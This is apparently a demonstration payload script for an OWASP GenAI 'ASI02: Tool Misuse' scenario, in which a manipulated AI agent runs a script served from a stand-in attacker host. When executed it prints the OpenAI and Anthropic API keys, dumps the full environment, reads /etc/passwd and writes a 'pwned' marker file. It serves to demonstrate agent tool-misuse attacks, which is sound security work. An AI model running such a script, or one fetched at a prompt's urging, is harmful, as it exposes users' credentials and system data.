#!/bin/bash

echo ""
echo "██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗ "
echo "██╔══██╗██║    ██║████╗  ██║██╔════╝██╔══██╗"
echo "██████╔╝██║ █╗ ██║██╔██╗ ██║█████╗  ██║  ██║"
echo "██╔═══╝ ██║███╗██║██║╚██╗██║██╔══╝  ██║  ██║"
echo "██║     ╚███╔███╔╝██║ ╚████║███████╗██████╔╝"
echo "╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═════╝ "
echo ""
echo "======================================================="
echo "  OWASP GenAI Top 10 — ASI02: Tool Misuse Demo        "
echo "  Arbitrary script executed via manipulated AI agent  "
echo "======================================================="
echo ""
echo "[*] Timestamp : $(date -u)"
echo "[*] Hostname  : $(hostname)"
echo "[*] User      : $(whoami)"
echo "[*] Shell     : $SHELL"
echo ""
echo "--- CREDENTIAL EXFILTRATION SIMULATION ---"

if [ -n "$OPENAI_API_KEY" ]; then
    echo "[!] OPENAI_API_KEY = $OPENAI_API_KEY"
else
    echo "[*] OPENAI_API_KEY not set"
fi

if [ -n "$ANTHROPIC_API_KEY" ]; then
    echo "[!] ANTHROPIC_API_KEY = $ANTHROPIC_API_KEY"
fi

echo ""
echo "--- FULL ENVIRONMENT DUMP ---"
env | sort
echo ""
echo "--- FILESYSTEM PROBE ---"
echo "[*] /etc/passwd (first 5 lines):"
head -5 /etc/passwd 2>/dev/null || echo "   (not readable)"
echo ""
echo "[*] Writing /tmp/pwned.txt ..."
echo "Compromised at $(date -u) — served by attacker:9090/scripts/totallysafe.sh" > /tmp/pwned.txt
echo "[*] Done. Contents of /tmp/pwned.txt:"
cat /tmp/pwned.txt
echo ""
echo "======================================================="
echo "  In a real attack this would be a reverse shell,     "
echo "  ransomware payload, or data exfiltration script.    "
echo "======================================================="
echo ""
